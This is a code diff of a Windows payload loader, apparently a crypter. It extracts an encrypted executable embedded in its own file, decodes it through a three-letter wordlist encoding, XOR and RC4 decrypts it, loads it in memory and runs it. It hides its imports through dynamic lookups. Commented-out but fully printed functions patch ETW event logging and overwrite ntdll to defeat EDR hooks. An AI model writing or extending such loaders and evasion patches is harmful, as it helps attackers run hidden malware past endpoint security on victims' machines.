@@ -2,9 +2,9 @@
 #include <stdlib.h>
 #include <stdint.h>
 #include <windows.h>
-#include <winternl.h>
-#include <ntdef.h>
-#include <psapi.h>
+// #include <winternl.h>
+// #include <ntdef.h>
+// #include <psapi.h>
 
 #define KEY_LENGTH 16 // 128 bits
 #define PRIME_LENGTH 8 // 64 bits
@@ -16,8 +16,8 @@
 void* load_PE (char* PE_data);
 int decrypt_elf(unsigned char *elf_buf, size_t file_size, unsigned char *key, size_t key_size);
 void import_table_obfuscation(void);
-void disable_etw(void);
-void remove_edr_hooks(void);
+// void disable_etw(void);
+// void remove_edr_hooks(void);
 
 typedef BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
 typedef HMODULE (WINAPI * pLoadLibraryA)(LPCTSTR lpFileName);
@@ -36,6 +36,19 @@ unsigned char sGetCurrentProcess[] = {'G','e','t','C','u','r','r','e','n','t','P
 unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
 unsigned char sNtdll[] = { 'N','t','d','l','l', 0x0 };
 
+char* wordlist[256] = {"raw\0", "moo\0", "zed\0", "nun\0", "hin\0", "ado\0", "vim\0", "lip\0", "tic\0", "pet\0", "xis\0", "tux\0", "jut\0", "zap\0", "fry\0", "ewe\0", "ice\0", "ink\0", "ask\0", "lay\0", "pod\0", "yam\0",
+                       "dig\0", "paw\0", "den\0", "ohm\0", "jay\0", "cog\0", "vex\0", "rot\0", "mop\0", "fad\0", "ode\0", "jow\0", "joy\0", "thy\0", "hex\0", "eel\0", "ape\0", "hum\0", "wop\0", "era\0", "jag\0", "toe\0",
+                       "zit\0", "nab\0", "cop\0", "jug\0", "mad\0", "oaf\0", "zag\0", "tat\0", "yen\0", "gym\0", "hop\0", "gab\0", "jab\0", "end\0", "tug\0", "tax\0", "bud\0", "bag\0", "wok\0", "bug\0", "yak\0", "god\0",
+                       "tad\0", "off\0", "fee\0", "mud\0", "nap\0", "hid\0", "dew\0", "add\0", "jar\0", "rag\0", "bus\0", "new\0", "hog\0", "vat\0", "jib\0", "jog\0", "gin\0", "red\0", "jam\0", "tee\0", "nut\0", "ale\0", 
+                       "sue\0", "arc\0", "top\0", "fin\0", "fly\0", "ear\0", "awe\0", "pen\0", "jig\0", "ate\0", "qua\0", "cam\0", "gut\0", "pad\0", "cob\0", "saw\0", "lid\0", "haw\0", "wag\0", "ram\0", "cow\0", "any\0",
+                       "bay\0", "elk\0", "owl\0", "aim\0", "rut\0", "dug\0", "yet\0", "cup\0", "fit\0", "oar\0", "pun\0", "ebb\0", "won\0", "coy\0", "urn\0", "fog\0", "kin\0", "qed\0", "sty\0", "tag\0", "gig\0", "wad\0",
+                       "vet\0", "ore\0", "fed\0", "jot\0", "bop\0", "gay\0", "run\0", "ivy\0", "tan\0", "lob\0", "tab\0", "gun\0", "fix\0", "big\0", "sit\0", "gem\0", "din\0", "sum\0", "hip\0", "cod\0", "rib\0", "bun\0",
+                       "eon\0", "zip\0", "bib\0", "van\0", "zoo\0", "dam\0", "ion\0", "woe\0", "nib\0", "hen\0", "ash\0", "yes\0", "dot\0", "rum\0", "ago\0", "mug\0", "icy\0", "sky\0", "ova\0", "ton\0", "ill\0", "nip\0",
+                       "ham\0", "jet\0", "tap\0", "sax\0", "lot\0", "bee\0", "sob\0", "mob\0", "sir\0", "why\0", "toy\0", "foe\0", "maw\0", "bet\0", "lei\0", "bid\0", "met\0", "bye\0", "box\0", "vie\0", "elm\0", "rue\0",
+                       "bed\0", "yep\0", "rye\0", "rub\0", "him\0", "mix\0", "wax\0", "boo\0", "way\0", "axe\0", "hut\0", "oak\0", "dye\0", "lap\0", "wed\0", "lug\0", "eve\0", "cub\0", "nod\0", "oat\0", "ace\0", "cab\0",
+                       "awl\0", "kit\0", "hay\0", "ran\0", "fig\0", "car\0", "dim\0", "log\0", "gad\0", "fox\0", "imp\0", "bog\0", "dip\0", "wry\0", "gas\0", "cot\0", "keg\0", "dab\0", "one\0", "air\0", "pat\0", "yip\0",
+                       "few\0", "yap\0", "nag\0", "gum\0", "pan\0", "orb\0", "ant\0", "zen\0", "hob\0", "gap\0", "pew\0", "men\0", "egg\0", "pal\0"};
+
 int main(int argc, char** argv) {
      if (argc > 1) {
         printf("Usage: %s\n", argv[0]);
@@ -43,8 +56,8 @@ int main(int argc, char** argv) {
     }
 
     import_table_obfuscation();
-    disable_etw();
-    remove_edr_hooks();
+    // disable_etw();
+    // remove_edr_hooks();
 
     FILE* loader_file = fopen(argv[0], "rb");
     if (loader_file == NULL) {
@@ -85,7 +98,7 @@ int main(int argc, char** argv) {
         if (!strcmp(sections[i].Name, payload_PE_section_name)) {
             printf("Found .rodata section\n");
             payload_PE = loader_handle + sections[i].VirtualAddress;
-            printf("Payload PE at VA: 0x%.8x\n", payload_PE);
+            printf("Payload PE at VA: 0x%.8x\n", *payload_PE);
             break;
         }
     }
@@ -109,15 +122,22 @@ int main(int argc, char** argv) {
     }
 
     printf("Decrypt PE\n");
-    decrypt_PE(pe_buf, encrypted_size, key);
+    memcpy(pe_buf, payload_PE, encrypted_size);
+    size_t original_size = encrypted_size/3;
+    char *decoded_buf = malloc(original_size);
+    memset(decoded_buf, 0, original_size);
+    decrypt_PE(pe_buf, decoded_buf, encrypted_size, original_size, key);
 
     printf("Load PE\n");
-    void* start_address = load_PE(pe_buf);
+    void* start_address = load_PE(decoded_buf);
 
     printf("Calling PE\n");
     if(start_address) {
         ((void (*)(void)) start_address)();
     }
+
+    free(pe_buf);
+    free(decoded_buf);
 
     return 0;
 }
@@ -289,66 +309,75 @@ void import_table_obfuscation(void) {
     fnVirtualProtect = (pVirtualProtect) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sVirtualProtect);
     fnLoadLibraryA = (pLoadLibraryA) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sLoadLibraryA);
     fnVirtualAlloc = (pVirtualAlloc) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sVirtualAlloc);
-    fnGetCurrentProcess = (pVirtualAlloc) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sGetCurrentProcess);
+    fnGetCurrentProcess = (pGetCurrentProcess) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sGetCurrentProcess);
 }
 
-void disableETW(void) {
-	unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3};     // xor rax, rax; ret
+// void disable_etw(void) {
+// 	unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3};     // xor rax, rax; ret
 	
-	ULONG oldprotect = 0;
-	size_t size = sizeof(patch);
+// 	ULONG oldprotect = 0;
+// 	size_t size = sizeof(patch);
 	
-	HANDLE hCurrentProc = fnGetCurrentProcess();
+// 	HANDLE hCurrentProc = fnGetCurrentProcess();
 	
-	void *pEventWrite = GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sEtwEventWrite);
+// 	void *pEventWrite = GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sEtwEventWrite);
 	
-    fnVirtualProtect(pEventWrite, size, PAGE_READWRITE, &oldprotect);
+//     fnVirtualProtect(pEventWrite, size, PAGE_READWRITE, &oldprotect);
 
-	memcpy(pEventWrite, patch, size / sizeof(patch[0]));
+// 	memcpy(pEventWrite, patch, size / sizeof(patch[0]));
 	
-    fnVirtualProtect(pEventWrite, size, oldprotect, &oldprotect);
-	FlushInstructionCache(hCurrentProc, pEventWrite, size);
-}
+//     fnVirtualProtect(pEventWrite, size, oldprotect, &oldprotect);
+// 	FlushInstructionCache(hCurrentProc, pEventWrite, size);
+// }
 
-int remove_edr_hooks(void) {
-    // Öffnen der Sektion für ntdll.dll in Known DLLs
-    UNICODE_STRING uNtdll = RTL_CONSTANT_STRING(L"\\KnownDlls\\ntdll.dll");
-    OBJECT_ATTRIBUTES objAttrs;
-    InitializeObjectAttributes(&objAttrs, &uNtdll, OBJ_CASE_INSENSITIVE, NULL, NULL);
-    HANDLE hSection;
-    NTSTATUS status = NtOpenSection(&hSection, SECTION_ALL_ACCESS, &objAttrs);
+// void remove_edr_hooks(void) {
+//     // Öffnen der Sektion für ntdll.dll in Known DLLs
+//     UNICODE_STRING uNtdll = RTL_CONSTANT_STRING(L"\\KnownDlls\\ntdll.dll");
+//     OBJECT_ATTRIBUTES objAttrs;
+//     InitializeObjectAttributes(&objAttrs, &uNtdll, OBJ_CASE_INSENSITIVE, NULL, NULL);
+//     HANDLE hSection;
+//     NTSTATUS status = NtOpenSection(&hSection, SECTION_ALL_ACCESS, &objAttrs);
 
-    if (!NT_SUCCESS(status)) {
-        printf("Konnte Sektion für ntdll.dll nicht öffnen\n");
-        return 1;
-    }
+//     if (!NT_SUCCESS(status)) {
+//         printf("Konnte Sektion für ntdll.dll nicht öffnen\n");
+//         return 1;
+//     }
 
-    // Mappen der Sektion in den eigenen Prozess
-    void* pLocalNtdll = NULL;
-    SIZE_T viewSize = 0;
-    status = NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalNtdll, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READWRITE);
+//     // Mappen der Sektion in den eigenen Prozess
+//     void* pLocalNtdll = NULL;
+//     SIZE_T viewSize = 0;
+//     status = NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalNtdll, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READWRITE);
 
-    if (!NT_SUCCESS(status)) {
-        printf("Konnte Sektion für ntdll.dll nicht mappen\n");
-        return 1;
-    }
+//     if (!NT_SUCCESS(status)) {
+//         printf("Konnte Sektion für ntdll.dll nicht mappen\n");
+//         return 1;
+//     }
 
-    // Überschreiben der .TEXT-Sektion
-    DWORD oldProtect;
-    fnVirtualProtect(pLocalNtdll, viewSize, PAGE_EXECUTE_READWRITE, &oldProtect);
-    BYTE patch[] = { 0x48, 0x33, 0xc0, 0xc3 };  // xor rax, rax; ret
-    memcpy(pLocalNtdll, patch, sizeof(patch));
+//     // Überschreiben der .TEXT-Sektion
+//     DWORD oldProtect;
+//     fnVirtualProtect(pLocalNtdll, viewSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+//     BYTE patch[] = { 0x48, 0x33, 0xc0, 0xc3 };  // xor rax, rax; ret
+//     memcpy(pLocalNtdll, patch, sizeof(patch));
 
-    // Entladen der sauberen ntdll.dll
-    fnVirtualProtect(pLocalNtdll, viewSize, oldProtect, &oldProtect);
-    NtUnmapViewOfSection(GetCurrentProcess(), pLocalNtdll);
-    NtClose(hSection);
-
-    return 0;
-}
+//     // Entladen der sauberen ntdll.dll
+//     fnVirtualProtect(pLocalNtdll, viewSize, oldProtect, &oldProtect);
+//     NtUnmapViewOfSection(GetCurrentProcess(), pLocalNtdll);
+//     NtClose(hSection);
+// }
 
 
 // =============== DEOBFUSCATION HERE ================
+
+char decode_word(char* word) {
+    for (int i = 0; i < 255; i++) {
+        if (!strcmp(wordlist[i], word)) {
+            // printf("%s == %s", wordlist[i], word);
+            // printf(" decoded: %.2x \n", i);
+            return (char)i;
+        }
+    }
+    return '\0';
+}
 
 uint64_t prime_number(uint64_t n) {
     uint64_t last_prime = 0;
@@ -390,13 +419,21 @@ void rc4_crypt(unsigned char *s, unsigned char *data, int data_len) {
     }
 }
 
-int decrypt_PE(unsigned char *pe_buf, size_t file_size, unsigned char *key) {
+int decrypt_PE(unsigned char *pe_buf, unsigned char *decode_buf, size_t encrypted_size, size_t original_size, unsigned char *key) {
 
     printf("Start prime calculation\n");
     uint64_t last_prime = prime_number(PRIME_TOP);
     uint8_t* prime_ptr = (uint8_t *)(&last_prime);
     printf("Last prime number: %llu\n", last_prime);
    
+    // Decode Words
+    char *decode_pos = decode_buf;
+    for (size_t i = 0; i < encrypted_size; i += 3) {
+        char word[4] = {pe_buf[i], pe_buf[i+1], pe_buf[i+2], '\0'};
+        *decode_pos = decode_word(word);
+        decode_pos++;
+    }
+
     // XOR decode key with prime 
     for (size_t i = 0; i < KEY_LENGTH; i++) {
         key[i] ^= prime_ptr[i % PRIME_LENGTH];
@@ -408,15 +445,15 @@ int decrypt_PE(unsigned char *pe_buf, size_t file_size, unsigned char *key) {
     }
     printf("Deobfuscated Key: %s\n", hex_string);
 
-
     // Decode XOR
-    for (size_t i = 0; i < file_size; i++) {
-        pe_buf[i] ^= key[i % KEY_LENGTH];
+    for (size_t i = 0; i < original_size; i++) {
+        decode_buf[i] ^= key[i % KEY_LENGTH];
     }
 
     unsigned char s[256];
     rc4_init(s, key);
-    rc4_crypt(s, pe_buf, file_size);
+    rc4_crypt(s, decode_buf, original_size);
 
+    printf("Decoded Last Byte: %.2x Decoded First Byte: %.2x\n", decode_buf[0], decode_buf[original_size-1]);
     return 0;
 }
